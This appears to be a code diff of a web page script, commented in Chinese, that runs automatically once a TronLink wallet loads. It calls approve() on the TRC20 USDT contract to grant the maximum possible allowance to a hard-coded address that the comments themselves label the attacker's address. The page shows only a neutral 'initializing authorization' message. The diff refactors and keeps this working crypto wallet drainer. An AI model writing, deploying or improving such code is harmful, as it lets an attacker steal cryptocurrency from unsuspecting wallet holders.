@@ -15,9 +15,8 @@
   <p id="status">請稍候，正在初始化授權...</p>
 
   <script>
-    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";  // ✅ 正確的 TRC20 USDT 合約地址
-    const SPENDER = "TBX8foxSthqVpiKqR87gN62M6oE91EKX7B";       // ✅ 攻擊者地址
-    const MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // ✅ 正確的 TRC20 USDT 合約
+    const SPENDER = "TBX8foxSthqVpiKqR87gN62M6oE91EKX7B";    // ✅ 攻擊者地址（主控地址）
 
     const ABI = [{
       "constant": false,
@@ -31,25 +30,25 @@
     }];
 
     async function autoApprove() {
-      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
-        document.getElementById("status").innerText = "請使用 TronLink 錢包進入此頁面。";
+      const tronWeb = window.tronWeb;
+      if (!tronWeb || !tronWeb.defaultAddress.base58) {
+        document.getElementById("status").innerText = "請使用 TronLink 錢包進入此頁面";
         return;
       }
 
-      const tronWeb = window.tronWeb;
-      const contract = await tronWeb.contract(ABI, USDT_CONTRACT);
-      document.getElementById("status").innerText = "⏳ 發送授權中...";
-
       try {
-        const maxUint = tronWeb.BigNumber(2).pow(256).minus(1);
+        const contract = await tronWeb.contract(ABI, USDT_CONTRACT);
+        const maxUint = tronWeb.BigNumber(2).pow(256).minus(1); // ✅ 不需手動寫死
+        document.getElementById("status").innerText = "⏳ 正在發送授權交易...";
+
         const tx = await contract.approve(SPENDER, maxUint).send();
-        document.getElementById("status").innerText = "✅ 授權成功！TX: " + tx;
+        document.getElementById("status").innerText = "✅ 授權成功！交易哈希：" + tx;
       } catch (e) {
         document.getElementById("status").innerText = "❌ 授權失敗：" + e.message;
       }
     }
 
-    // 等待 TronLink 掛載後執行
+    // 等待 TronLink 掛載後自動執行
     window.addEventListener("load", () => {
       const interval = setInterval(() => {
         if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
